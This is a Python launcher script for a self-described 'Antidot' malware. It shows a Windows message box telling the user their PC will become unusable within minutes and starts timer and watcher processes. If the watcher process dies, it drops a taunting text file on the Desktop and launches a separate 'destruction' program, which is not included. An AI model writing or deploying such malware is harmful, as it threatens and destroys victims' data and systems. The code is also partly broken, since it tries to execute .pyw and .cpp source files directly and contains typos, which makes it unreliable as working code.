import psutil
import os
from subprocess import call
from win32ui import *
from win32con import *

# Error message, no instructions
MessageBox(
    "Warning, your PC is now infeced by the Antidot malware.\n"
    "From now you have 3 minutes to disinfect it, after that, your PC will become unusable.\n"
    "There will be nothing you can do for taking your files back, "
    "the only thing you can do is either save all of your important files in 5 minutes, "
    "or try to remove the Antidot malware from your PC.\n"
    "Good luck and have fun.",
    "Antidot",
    MB_ICONERROR
)

# Starting progra watche and timer
call(["AntidotTimer.pyw"])
call(["AntidotCheck.cpp"])

# Checking if file watcher is checking
def check_check() -> None:
    while True:
        running = "AntidotCheck.cpp" in (p.name() for p in psutil.process_iter())

        # If it is not running start destruction
        if running == False:
            # Getting desktop path and adding .txt file
            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            with open(f"{desktop}//ANTIDOT.txt", "w") as f:
                f.write(
                    "If you're seeing this either could things could've happened:\n"
                    "1) You succeeded to disable Antidot, so great job!\n"
                    "2) Something as gone wrong with the virus and you're still here!\n"
                    "So you've either been lucky or very skillful..."
                )

            call(["AntidotDestruction.cpp"])
            break

check_check()